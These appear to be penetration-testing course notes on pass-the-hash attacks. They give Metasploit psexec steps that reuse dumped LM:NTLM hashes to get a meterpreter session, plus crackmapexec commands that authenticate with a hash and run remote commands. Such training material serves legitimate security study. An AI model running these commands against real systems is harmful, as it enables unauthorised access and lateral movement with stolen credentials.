# D - Pass the Hash Attacks

After obtaining NTLM hashes, what can we do with them apart from cracking them?

We can perform a "Pass the hash Attack".

### **Pass-The-Hash**

* Pass-The-Hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
* We can use multiple tools to facilitate a Pass-The-Hash attack:
  * Metasploit PsExec module
  * Crackmapexec
* This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.



## **Practical Demonstration**

#### Using  \[psexec] Metasploit module

```bash
# after getting the administrator NTLM hash from "kiwi" extension, we can copy it into to a "cred.txt" file.
# Administrator: <hash>
# student: <hash>

# step 1
# in order to use the "psexec" module, we need to get the LM hash in addition to the NTLM or NT hash we already got above.
# how to get the LM hash?
hashdump # in the meterpreter session.
# hashdump displays the <acct_name>:<ID>:LM_hash:NTLM_hash:::
# so we copy the [LM_hash:NTLM_hash] of the required user we need, then paste in same "cred.txt" file above.
ctrl+Z # minimize current meterpreter session.
search psexec
use exploit/windows/smb/psexec
# you can leave the default 32bit payload.
options
set LPORT 4422
set RHOSTS $ip
set SMBUser Adinistrator
set SMBPass <LM_hash:NTLM_hash>
set target <tab+key> # for more options.
set target Native\ upload # upload the meterpreter payload.
exploit
# we get a meterpreter session.
sysinfo 
getuid

session -K # to kill sessions.
```

#### Using  \[crackmapexec]

`crackmapexec smb $ip -u Administrator -H "<NITLM_hash ONLY>"` - authenticate with the creds.

`crackmapexec smb $ip -u Administrator -H "<NITLM_hash ONLY>" -x "ipconfig"`  - we get the cmd result with some errors, but don't worry abt it (:



